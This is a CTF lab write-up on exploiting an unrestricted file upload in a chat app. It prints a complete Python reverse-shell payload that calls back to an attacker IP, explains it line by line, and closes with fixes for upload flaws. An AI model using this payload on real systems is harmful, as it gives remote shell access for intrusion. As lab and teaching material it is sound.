
---

- Lab objective and difficulty level  
    
- **Step-by-step exploitation methodology**  
    
- **Payloads that worked** (and ones that didn't)  
    
- **Request/response samples** (screenshots or raw text)  
    
- **Why** the vulnerability existed and how to fix it
    
- **What was the application's mistake?**
    
- **What did my input change?**
    
- **Why did my payload work?**
    
- **How could I recognize this vulnerability again without a walkthrough?**

---

# - Lab objective and difficulty level 


```
My Dearest Hacker,

Days before Valentine's Day, TryHeartMe rushed out a new messaging platform called "Speed Chatter", promising instant connections and private conversations. But in the race to beat the holiday deadline, security took a back seat. Rumours are circulating that "Speed Chatter" was pushed to production without proper testing.

As a security researcher, it's your task to break into "Speed Chatter", uncover flaws, and expose TryHeartMe's negligence before the damage becomes irreversible.

You can find the web application here: http://MACHINE_IP:5000
```

# - **Step-by-step exploitation methodology**  

```
- In this CTF we got chat room. So to exploit this machine first i tried xss but its getting encoded but also there is file upload functionality. So maybe we can exploit this but first we have to know the server language. 

- Using wappalyzer we got to know the server language so lets upload a file and see is there any sanitzation in the background.
  
- After uploading a file we can see that there is no sanitization
```

![Pasted image 20260824122427](../../../../Images/Pasted%20image%2020260824122427.png)

![Pasted image 20260824122747](../../../../Images/Pasted%20image%2020260824122747.png)

```
- So we can use revserse shell python payload for exploitation.
```

---
# **Payloads that worked** (and ones that didn't)

```
import os,socket,subprocess;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("MY IP}",1234));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/bash","-i"]);
```

```
So i used this payload for reverse shell
```

## - Explanation of payload

This is a **Python reverse-shell payload**. It makes the machine running this code connect back to `192.168.167.185` on port `1234`, then gives the remote side an interactive Bash shell.

Assuming this is your own lab/CTF machine, here’s what each line does:

```python
import os, socket, subprocess
```

Imports three Python modules:

- `socket` → creates network connections.
    
- `os` → lets Python manipulate file descriptors.
    
- `subprocess` → starts other programs, here `/bin/bash`.
    

---

```python
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
```

Creates a TCP socket.

- `AF_INET` → IPv4.
    
- `SOCK_STREAM` → TCP.
    

So `s` represents a TCP connection.

---

```python
s.connect(("192.168.167.185", 1234))
```

The machine executing the payload **initiates a connection** to:

- IP: `192.168.167.185`
    
- Port: `1234`
    

This is why it's called a **reverse shell**: the target connects _back_ to the listener rather than the listener connecting directly to the target.

---

### The important part

```python
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
```

These redirect the process's standard input/output/error.

Linux uses file descriptors:

|FD|Meaning|
|--:|---|
|`0`|stdin — input|
|`1`|stdout — normal output|
|`2`|stderr — error output|

`s.fileno()` gets the socket's file descriptor.

So:

```text
stdin  → socket
stdout → socket
stderr → socket
```

This means data received through the socket becomes input to the shell, while shell output/errors go back through the socket.

---

```python
p = subprocess.call(["/bin/bash", "-i"])
```

Starts:

```text
/bin/bash -i
```

`-i` means **interactive Bash**.

Because the previous three lines redirected stdin/stdout/stderr to the socket, the Bash session communicates through that network connection.

Conceptually:

```text
Remote machine
     │
     │ TCP connection
     ▼
192.168.167.185:1234
     │
     ▼
   socket
     │
     ├── stdin
     ├── stdout
     └── stderr
          │
          ▼
       /bin/bash
```

### So the entire payload does this

```text
1. Create TCP socket
2. Connect to 192.168.167.185:1234
3. Redirect stdin → socket
4. Redirect stdout → socket
5. Redirect stderr → socket
6. Start interactive Bash
```

---

```
- So now i have to upload this payload but first we have to open a netcat listener on our attacking machine.

- after uploading shell we got a reverse shell now we can access files of the server.
  
- Now we have successfully got the flag.
```

![Pasted image 20260824125826](../../../../Images/Pasted%20image%2020260824125826.png)

# **Why** the file upload vulnerability exist and how to fix it

A **file upload vulnerability** exists when a web application lets users upload files but **doesn't sufficiently validate, restrict, or safely handle those files**.

### Why does it exist?

A vulnerable application might do something like:

```text
User → uploads file → Server saves file → File can be accessed/executed
```

The problem is that the developer may trust information supplied by the client.

For example, checking only:

```text
filename = "image.jpg"
```

is **not enough** to prove that the file actually contains an image.

Common causes include:

1. **Only checking the file extension**
    
    - Blocking `.php` but allowing `.jpg` isn't sufficient.
        
    - An attacker may manipulate the filename or file contents.
        
2. **Trusting the `Content-Type` header**
    
    - The browser/client sends this header, so it shouldn't be treated as proof of the file type.
        
3. **Storing uploads inside the web root**
    
    - For example:
        
    
    ```text
    /var/www/html/uploads/
    ```
    
    If executable files can be uploaded there, the web server may execute them.
    
4. **Allowing dangerous file types**
    
    - Executable scripts or server-side code should generally not be accepted as user uploads.
        
5. **Poor filename handling**
    
    - User-controlled filenames can cause path traversal, overwrites, or other filesystem problems if not safely handled.
        
6. **No size/resource limits**
    
    - Very large uploads can consume disk space or memory and potentially cause denial of service.
        

---

### How to fix it

A secure upload system should use **defense in depth**:

```text
             Upload
                │
                ▼
        ┌───────────────┐
        │ Size check    │
        └───────┬───────┘
                ▼
        ┌───────────────┐
        │ File type     │
        │ validation    │
        └───────┬───────┘
                ▼
        ┌───────────────┐
        │ Generate safe │
        │ filename      │
        └───────┬───────┘
                ▼
        ┌───────────────┐
        │ Store outside │
        │ web root      │
        └───────┬───────┘
                ▼
        ┌───────────────┐
        │ Serve as data │
        │, not code     │
        └───────────────┘
```

### The most important fix

**Don't let uploaded files become executable code.**

For example, instead of:

```text
/var/www/html/uploads/userfile
```

store them somewhere that the web server cannot execute:

```text
/var/app/uploads/random-id
```

Then when someone wants the file, your application can retrieve it and serve it as a normal file.

Also:

- Use an **allowlist** of permitted file types.
    
- Validate the actual file content, not just the extension.
    
- Generate a random server-side filename.
    
- Don't use the user's filename directly as a filesystem path.
    
- Set reasonable upload-size limits.
    
- Apply appropriate filesystem permissions.
    
- Consider malware scanning for files that need it.
    
- Configure the web server so the upload directory **cannot execute scripts**.
    
- Keep the application and upload-processing libraries updated.
    

### In one sentence

> **The vulnerability exists because untrusted user-controlled files are accepted and handled as though they were safe; the fix is to treat every upload as untrusted data and prevent it from being interpreted as executable code.**